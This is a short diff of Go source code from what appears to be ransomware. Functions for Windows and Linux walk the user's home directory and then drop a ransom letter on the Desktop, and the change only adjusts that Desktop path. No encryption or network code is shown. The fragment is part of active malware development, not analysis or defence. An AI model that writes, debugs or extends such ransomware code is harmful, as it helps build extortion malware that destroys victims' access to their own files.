@@ -121,7 +121,7 @@ func osWindows() {
 	}
 	explore_directory(user_dir)
 
-	var file_path string = filepath.Join(user_dir, "Desktop")
+	var file_path string = filepath.Join(user_dir, "/Desktop")
 	create_ransom_letter(file_path)
 }
 
@@ -137,7 +137,7 @@ func osLinux() {
 	}
 	explore_directory(home_dir)
 
-	var file_path string = filepath.Join(home_dir, "Desktop")
+	var file_path string = filepath.Join(home_dir, "/Desktop")
 	create_ransom_letter(file_path)
 }
 
